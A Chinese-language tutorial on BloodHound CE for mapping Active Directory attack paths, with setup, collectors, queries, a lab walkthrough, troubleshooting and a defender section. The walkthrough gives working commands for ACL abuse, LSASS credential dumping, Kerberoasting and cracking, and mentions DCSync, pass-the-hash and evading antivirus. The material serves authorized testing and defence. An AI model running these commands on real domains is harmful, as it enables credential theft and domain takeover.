# BloodHound CE（AD 攻击路径图谱）

> **一句话**：把 Active Directory 里的用户、组、主机、会话、ACL、委派关系画成一张图，用图算法算出「从我这个低权限账号到域管，最短几步、走哪条边」。
> **分类**：后渗透 / 发现 ｜ **Kali 包**：`bloodhound`（命令 `bloodhound-setup`、`bloodhound-start`，本版本为 **BloodHound CE** 9.x）｜ **官方文档**：<https://bloodhound.readthedocs.io/> ｜ 项目：<https://github.com/SpecterOps/BloodHound>

---

## 1. 它解决什么问题

AD 环境里「我能到哪」不是靠猜的。一个普通用户可能因为：

- 对某个组有 `GenericAll`/`WriteDacl`（可直接提权）；
- 是某台主机的本地管理员，而那台主机上有域管的**登录会话**（可抓域管票据）；
- 某个服务账号配置了**无约束委派**（可冒充任意用户）；
- 属于某个组的嵌套成员，间接拥有对他人的 `ForceChangePassword`；

而成为域管。这些关系**跨几十个对象、嵌套多层**，人脑理不清。BloodHound 就是干这个的：

| 你想知道 | BloodHound 的答案 |
|----------|-------------------|
| 我离域管还差几条边 | `Shortest Paths to Domain Admins` 内置查询 |
| 哪些用户「不需预认证」（AS-REP Roastable） | `List all Kerberoastable/AS-REP Roastable accounts` |
| 谁在哪些主机上登录过 | `Sessions`/`LoggedOn` 边 → 找「域管登录的机器」 |
| 哪些 ACL 能被我滥用 | 点节点看 `Outbound Object Control`/`Inbound` |
| 哪些服务账号可 Kerberoast | `Kerberoastable Users` 查询 |

对比同类：

- **vs `nxc ldap`/`impacket` 枚举**：那些给你**列表**，BloodHound 给你**图与最短路径**。数据互补（BloodHound 的采集器也可以用 `nxc --bloodhound`）。
- **vs `PingCastle`/`AD ACL Scanner`**：功能重叠，BloodHound 的分析与可视化更强、社区查询（Cypher）生态最丰富。
- **vs 手工翻 ACL**：`dsacls`/`Get-ACL` 逐条看，量级上不可行。

---

## 2. 工作原理

```
采集（Collector）                      存储与分析                       可视化
─────────────────                   ────────────────                ──────────────
SharpHound.exe（Windows，C#）  ─┐
BloodHound.py / nxc --bloodhound├─► 一组 JSON/ZIP ──► Neo4j 图数据库 ──► Web UI（CE：8080）
（Linux，LDAP 远程采集）        ─┘        │                                   │
                                        │                                   └─ Cypher 查询
                                   采集的内容：
                                   • 用户/组/计算机/OU/GPO/域/容器（节点）
                                   • MemberOf / AdminTo / HasSession /
                                     CanRDP / AllowedToDelegate /
                                     GenericAll / WriteDacl / Owns（边）
```

关键概念：

- **节点（Node）**：AD 对象（用户、组、计算机、GPO、OU、域）。
- **边（Edge）**：关系与可利用性。最常用的几条：
  - `MemberOf`（组成员）
  - `AdminTo`（对该主机有本地管理员权限）
  - `HasSession`（用户在该主机上有活动会话 → **抓票据的机会**）
  - `CanPSRemote` / `CanRDP`
  - `AllowedToDelegate` / `AllowedToAct`（委派）
  - `GenericAll` / `GenericWrite` / `WriteDacl` / `WriteOwner` / `ForceChangePassword`（ACL 滥用）
- **内置查询**：`Shortest Paths to Domain Admins`、`Find all domains where users don't require pre-auth`、`Shortest Paths from Kerberoastable Users` 等，开箱即用。
- **CE（Community Edition）架构**：PostgreSQL（应用数据）+ Neo4j（图数据）+ 内置 API（`/etc/bhapi/bhapi.json` 配置），Web UI 与 API 同端口（默认 8080）。

---

## 3. 安装与快速上手

Kali 打包的是 **BloodHound CE**，安装步骤与旧版（Electron 客户端 + 手工起 Neo4j）不同，按官方文档走：

```bash
sudo apt update
sudo apt install bloodhound

# ① 初始化（起 PostgreSQL、建库、建 Neo4j）
sudo bloodhound-setup

# ② 首次需要设置 Neo4j 口令，然后同步到 BH API 配置
#    浏览器打开 http://localhost:7474 ，用 neo4j / neo4j 登录并按提示改密
sudo vim /etc/bhapi/bhapi.json      # 把其中的 password 改成刚设置的新口令
```

```console
$ sudo bloodhound-start
[*] Web UI: http://127.0.0.1:8080
```

```bash
sudo bloodhound-stop        # 用完就停
```

首次登录（默认口令 **admin / admin**，登录后会要求改）：

```
http://127.0.0.1:8080
```

忘记了管理员口令：

```bash
sudo env bhe_recreate_default_admin=true bloodhound-start
```

> Kali 提示 `bloodhound` 命令**已废弃**，请用 `bloodhound-start`；`bloodhound-setup` 必须先跑一次，否则 `bloodhound-start` 会提示 "Please run bloodhound-setup first"。

采集数据（三种途径，任选其一）：

```bash
# 途径 A：Linux 上远程采集（推荐，无需落地 Windows 工具）
nxc ldap <DC-IP> -u <user> -p '<pass>' --bloodhound -c All --dns-server <DC-IP>

# 途径 B：BloodHound.py（独立采集器）
bloodhound-python -u <user> -p '<pass>' -d contoso.local -ns <DC-IP> -c All

# 途径 C：Windows 域内主机上跑 SharpHound.exe（离线/更全）
#   SharpHound.exe -c All --zipfilename bh.zip
```

> 采集器本身（`bloodhound-python`/`SharpHound`）不在 Kali 的 `bloodhound` 包内；`bloodhound-python` 可用 `pip install bloodhound` 或 `sudo apt install bloodhound.py`（视仓库版本），也可直接用 `nxc` 的内置采集。

然后在 Web UI：`Administration → File Ingest → Upload` 上传 zip。

---

## 4. 核心参数详解

### 4.1 Kali 命令

| 命令 | 作用 | 使用建议 |
|------|------|----------|
| `bloodhound-setup` | 初始化 PostgreSQL/Neo4j/BH API | **只跑一次**；换机/重置时也用它 |
| `bloodhound-start` | 启动服务（systemd） | Web UI 默认 `http://127.0.0.1:8080` |
| `bloodhound-stop` | 停止服务 | 用完即停，减少攻击面 |
| `sudo vim /etc/bhapi/bhapi.json` | BH API 与 Neo4j 的连接配置 | 改了 Neo4j 口令必须同步这里 |

### 4.2 采集器参数（`bloodhound-python` / `nxc --bloodhound`）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-c All` / `-c`（nxc） | 采集全部集合 | 首次全量 |
| `-c DCOnly` | 只采域对象（不碰主机） | **最隐蔽**，只发 LDAP 查询，不登陆主机 |
| `-c Group,ACL,Session,Trusts,ObjectProps,Container,...` | 按需采集 | 知道要什么时用，降低噪音 |
| `-u` / `-p` / `-H`（nxc） | 凭据 | 普通域用户即可采到大部分信息 |
| `-d <domain>` | 域 | 多域环境逐个采 |
| `-ns <DC-IP>` | DNS/域控 | 必填 |
| `-dc <DC>`（nxc 用 `--dns-server`） | 指定域控 | 多 DC 时指定 |
| `--zip` / `--zipfilename` | 打包成 zip | 便于上传 UI |
| `--stealth`（SharpHound） | 更少的查询（少 Session 采集） | 容易被检测的环境 |
| `--collectionmethod Session` | 只采会话 | 找「域管在哪台机器」时单独补采 |
| `--threads` | 并发 | 大域调高，但动静更大 |
| `--use-kcache`（nxc） | Kerberos 票据认证采集 | 票据场景 |

### 4.3 Web UI 里必用的查询

| 查询名 | 用途 |
|--------|------|
| `Shortest Paths to Domain Admins` | 从任意点（含 Owned 节点）到域管的最短路径 |
| `Mark as Owned`（右键节点 / 或上传 Owned 列表） | 把你已控制的账号标记为 Owned，路径才算「真实可达」 |
| `Find all Kerberoastable Users` | 找可 Kerberoast 的服务账号 |
| `Find AS-REP Roastable Users` | 找不需预认证的账号 |
| `Shortest Paths from Kerberoastable Users` | 从可 Kerberoast 账号到域管的路径 |
| `Find Computers where Domain Users has Local Admin Rights` | 找「普通域用户=本地管理员」的主机 |
| `Shortest Paths to High Value Targets` | 高价值目标（含 DC）路径 |
| `List all Sessions of Domain Admins` | 域管登录过哪些机器 |
| `Find Principals with DCSync Rights` | 谁有复制权限（可做 DCSync） |
| `Cypher 自定义查询` | 高级分析（社区有大量现成语句） |

---

## 5. 实战演练

> **环境声明**：全部在**自建 AD 靶场**中进行。**最佳选择：GOAD**（Game of Active Directory，开源、专为这类练习设计，含多域、委派、ACL 滥用等真实场景）。示例：域 `contoso.local`，DC `192.168.56.10`，攻击机 `192.168.56.5`。**禁止对未授权的域执行采集**——即使是「只读 LDAP」也会在 DC 上留下大量日志。

### 场景 1：部署 + 采集 + 上传（把图跑起来）

```bash
# ① 初始化与启动（只在首次做）
sudo bloodhound-setup
curl -sk https://127.0.0.1:8080 > /dev/null || sudo bloodhound-start
sudo bloodhound-start
```

```console
[*] Web UI: http://127.0.0.1:8080
```

```bash
# ② 采集（用普通域用户 jdoe，验证「低权限也能拿到全图」）
nxc ldap 192.168.56.10 -u jdoe -p 'Summer2024!' \
    --bloodhound -c All --dns-server 192.168.56.10
ls -l *_BloodHound.zip
```

```console
LDAP  192.168.56.10  389  DC01  [+] 20240915120500_BloodHound.zip (containing 812 objects)
LDAP  192.168.56.10  389  DC01  [+] 1 domains, 82 users, 12 computers, 133 groups
```

**解读**：`containing 812 objects` 表示采集成功；行尾统计（users/computers/groups）帮你判断是否符合预期规模。**注意：普通域用户往往就能采集到绝大部分关系**——这正是 AD 的固有暴露面。

```bash
# ③ 上传：Web UI → Administration → File Ingest → Upload Files → 选 zip
```

### 场景 2：读图 —— 找到「你是如何成为域管的」

**Step 1**：在搜索框（左上）搜到你手上的账号 `JDOE@CONTOSO.LOCAL`，右键 → `Mark as Owned`（标记为已控制）。

> **这一步很关键**：只有标记为 Owned，路径查询才会从这些节点出发计算「实际可达路径」，否则你看到的是理论路径。

**Step 2**：点左侧 `Analysis` → `Shortest Paths to Domain Admins from Owned Principals`。

```console
JDOE@CONTOSO.LOCAL
   └─(MemberOf)─► HELP DESK@CONTOSO.LOCAL
        └─(GenericAll)─► IT SUPPORT@CONTOSO.LOCAL
             └─(MemberOf)─► DOMAIN ADMINS@CONTOSO.LOCAL
```

**解读（这就是报告里最有价值的内容）**：攻击链是

1. `JDOE` 属于 `HELP DESK`；
2. `HELP DESK` 对 `IT SUPPORT` 组有 `GenericAll`（完全控制）→ 可以把任意账号加入 `IT SUPPORT`；
3. `IT SUPPORT` 是 `Domain Admins` 的成员 → 提权完成。

对应实操（授权环境下）：

```bash
# 通过 GenericAll 把自己加入 IT SUPPORT（示例，具体命令视 ACL 类型）
impacket-dacledit -action write -rights WriteMembers \
  -principal JDOE -target 'IT SUPPORT' \
  'CONTOSO/Administrator:Passw0rd!'@192.168.56.10

# 或直接用 bloodyAD / 原生 AD 命令把 JDOE 加入组，然后验证域管权限
nxc smb 192.168.56.10 -u jdoe -p 'Summer2024!' --groups
```

**Step 3**：换一条更「经典」的路径——找域管登录过的主机：

```cypher
// 在 Web UI 的 Cypher 输入框里执行
MATCH (u:User {name:'ADMINISTRATOR@CONTOSO.LOCAL'})-[r:HasSession]->(c:Computer)
RETURN u.name, c.name, r.lastseen
```

```console
u.name                  c.name                    r.lastseen
ADMINISTRATOR@CONTOSO   WEB01.CONTOSO.LOCAL       2024-09-14T22:11:03Z
```

**解读**：域管最近在 `WEB01` 上登录过 → 这台机器的 **LSASS 内存里可能有域管的凭据/票据**。于是优先攻陷 `WEB01`，再从内存里取域管材料。这是 AD 攻击里最高效的一条路径。

```bash
# 攻陷 WEB01 后用 lsassy 抓内存凭据（见 netexec.md）
nxc smb 192.168.56.20 --local-auth -u Administrator -H ':31d6...' -M lsassy
```

### 场景 3：Kerberoast / AS-REP / DCSync 三张图，指导实际攻击

```cypher
// ① 谁可以 Kerberoast（有 SPN 的用户账号）
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'KRBTGT'
RETURN u.name, u.serviceprincipalnames ORDER BY u.name
```

```console
u.name                    u.serviceprincipalnames
SVC_MSSQL@CONTOSO.LOCAL   ["MSSQLSvc/db01.contoso.local:1433"]
SVC_BACKUP@CONTOSO.LOCAL  ["backup/web01.contoso.local"]
```

```bash
# 直接把结果拿去 Kerberoast
impacket-GetUserSPNs -request -dc-ip 192.168.56.10 'CONTOSO/jdoe:Summer2024!' \
  -outputfile /tmp/kerb.txt
hashcat -m 13100 /tmp/kerb.txt /usr/share/wordlists/rockyou.txt
```

```cypher
// ② 谁有不需预认证的账号（AS-REP Roastable）
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

```cypher
// ③ 谁有 DCSync 权限（可复制目录）
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN p
```

**解读**：BloodHound 的价值就是**把「枚举结果」变成「可执行的攻击清单」**：清单①→`GetUserSPNs`，清单②→`GetNPUsers`，清单③→`secretsdump -just-dc`。三条命令见 [`impacket.md`](impacket.md)。

---

## 6. 输出解读

| 现象 | 含义 | 下一步 |
|------|------|--------|
| 上传成功但图是空的 | 采集范围不对/权限不足 | 换账号重采；确认 `-c All` 生效 |
| 路径查询无结果 | 没把已控账号 `Mark as Owned` | 逐个标记 Owned 再查 |
| 出现 `MemberOf` → `Domain Admins` 一跳 | 你的账号**已经**是域管（或嵌套成员） | 用 `nxc smb --groups` 验证 |
| 出现 `GenericAll`/`WriteDacl` 边 | 可滥用 ACL 提权 | 用 `impacket-dacledit` 等工具落实（**授权环境**） |
| 出现 `HasSession` → 域管 | 高价值目标主机 | 优先攻陷该主机并抓内存凭据 |
| 出现 `AllowedToDelegate` | 可做委派滥用 | 用 `impacket-getST -impersonate` |
| `AdminTo` 指向多台主机 | 本地管理员复用 | 直接 PTH 横向（`nxc`/`impacket`） |
| 采集报 `LDAP bind failed` | 凭据错误/被限流 | 检查凭据；降 `--threads`；避开工作时间 |
| 采集耗时极长 | 域规模大 / 采了 Session | 用 `-c DCOnly` 先拿结构，再补 Session |
| Neo4j 启动失败 | 端口占用/密码未同步 | 查 `/etc/bhapi/bhapi.json` + `journalctl -u neo4j` |

---

## 7. 与其他工具配合

```
采集 ──► BloodHound（图 + 最短路径）
   │            │
   │            ├─► Kerberoastable 清单 ──► impacket-GetUserSPNs ──► hashcat -m 13100
   │            ├─► AS-REP 清单 ──────────► impacket-GetNPUsers ──► hashcat -m 18200
   │            ├─► DCSync 权限者 ────────► impacket-secretsdump -just-dc
   │            ├─► HasSession → 域管 ────► 攻陷主机 ──► nxc -M lsassy / mimikatz
   │            └─► ACL 滥用路径 ─────────► impacket-dacledit / owneredit / rbcd
   │
   └─► 实际连通性验证 ──► netexec / crackmapexec（BloodHound 说「理论上能」，nxc 说「现在能」）
```

- 采集与批量验证：[`netexec.md`](netexec.md)、[`crackmapexec.md`](crackmapexec.md)
- 凭据获取与票据伪造：[`impacket.md`](impacket.md)、[`mimikatz.md`](mimikatz.md)
- 交互式落脚：[`evil-winrm.md`](evil-winrm.md)
- 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `bloodhound-start` 提示 "Please run bloodhound-setup first" | 未初始化 | 先 `sudo bloodhound-setup` |
| 改了 Neo4j 密码后 UI 报连接失败 | BH API 配置未同步 | 改 `/etc/bhapi/bhapi.json` 里的 `neo4j.password`，重启服务 |
| 忘了 admin 口令 | 本地账号 | `sudo env bhe_recreate_default_admin=true bloodhound-start` |
| UI 打不开 8080 | 服务未起/端口占用 | `sudo bloodhound-start`；`ss -lntp \| grep 8080` |
| 上传 zip 报格式错误 | 采集器版本与 CE 版本不匹配 | 用与当前 CE 配套的采集器；或改用 `nxc --bloodhound` 采集 |
| 图里缺少会话数据 | 未采集 `Session`（或用了 `--stealth`） | 单独补采 `Session` 集合 |
| 采集触发大量告警 | 全量采集动静大 | 先 `DCOnly`，再按需补；控制并发与时间窗 |
| `Mark as Owned` 后路径仍为空 | 该账号确实无法达域管 | 换其它已控账号标记；或先拿到更多凭据 |
| 查询超时 | 图太大 / 服务器资源不足 | 清空旧数据（UI 里 `Clear Database`）、分域导入、加内存 |
| 采集器在 Windows 被杀 | 杀软拦 SharpHound | 授权环境下用混淆版本或改从 Linux 采集 |

---

## 9. 防御视角（蓝队）

**BloodHound 自身是「防御工具」**：同一条攻击路径既可以用来打，也可以用来**提前切断**。SpecterOps（其开发方）也明确把它定位为红蓝共用。

| 攻击者做的事 | 检测信号 | 缓解措施 |
|--------------|----------|----------|
| LDAP 全量枚举 | 事件 **1644**（昂贵的 LDAP 查询）、短时间内大量 `objectClass=*`/`memberOf` 查询、异常 UA（`SharpHound`/`bloodhound-python`） | 限制匿名 LDAP、开启 LDAP 签名 + **通道绑定**、EDR 检测枚举特征、监控 1644 |
| 采集窗口内的密码喷洒 | 事件 4625 聚集 | 智能锁定、告警聚合 |
| 会话采集（`net session`/远程注册表） | 事件 4624 集中、SMB 访问 `srvsvc` | 限制本地管理员、禁用 RemoteRegistry |
| **结构性风险（真正的病根）** | —— | ① 消除**嵌套组**与不必要的 `Domain Admins` 成员；② 审计并收敛 ACL（`GenericAll`/`WriteDacl` 交给审计团队定期跑） |
| 域管登录普通工作站 | 域管账号出现在非 DC 主机的 4624 | **分层管理模型（Tier Model）**：域管只能登录 Tier 0（DC）；Tier 1 服务器用独立管理账号；**禁用域管交互式登录工作站** |
| 服务账号可 Kerberoast | 事件 4769 中 RC4（`0x17`）票据请求 | 服务账号改 **gMSA**、强制 AES、随机长口令 |
| 不需预认证的账号 | 事件 4768 `Pre-Auth Type = 0` | 消除 `UF_DONT_REQUIRE_PREAUTH` |
| 非 DC 拥有 DCSync 权限 | 事件 4662 | 收敛 `Replicating Directory Changes` 权限 |
| 无约束委派 | 属性 `TRUSTED_FOR_DELEGATION` 被设置 | 改**基于资源的约束委派（RBCD）** 或禁用委派 |

**蓝队行动建议（可落地）**：在自己的环境里安装 BloodHound、用只读账号采集、定期跑 `Shortest Paths to Domain Admins`，把「不可接受的路径」列入整改清单。这比任何一次渗透测试都更能提升 AD 安全水位。

---

## 10. 参考

- BloodHound 官方文档：<https://bloodhound.readthedocs.io/>
- BloodHound CE 仓库：<https://github.com/SpecterOps/BloodHound>
- GOAD 靶场（练习用）：<https://github.com/Orange-Cyberdefense/GOAD>
- MITRE ATT&CK · 域信任发现（T1482）、账户发现（T1087）、会话发现（T1033）
- Kali 工具页：<https://www.kali.org/tools/bloodhound/>
- 本地命令：`bloodhound-setup -h`、`bloodhound-start -h`、`bloodhound-stop -h`

## ⚠️ 法律与伦理

未经授权采集 AD 数据（LDAP 枚举、会话收集、ACL 导出）属于对计算机信息系统的**未授权访问与数据获取**，可能触犯《刑法》第 285 条；导出的数据包含大量**员工个人信息**（账号、登录时间、组织结构），涉及《个人信息保护法》《数据安全法》。

BloodHound 是少见的「红蓝皆宜」工具：本教程请优先以**防御者视角**使用——在**自家环境**中采集、分析、整改。任何针对客户环境的采集必须获得**书面授权**，且采集范围（域、时间窗）需事先书面确认。
